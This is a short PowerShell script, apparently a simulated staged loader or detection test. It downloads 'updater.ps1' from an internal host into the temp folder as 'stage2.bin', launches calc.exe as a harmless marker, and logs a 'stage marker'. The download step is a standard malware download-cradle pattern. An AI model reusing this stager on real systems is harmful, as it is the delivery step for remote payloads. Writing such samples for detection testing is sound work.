
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://internal.corp:80/updater.ps1",
    [string]$WorkingPath = "$env:TEMP\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $WorkingPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Write-Verbose "stage marker 17 reached"
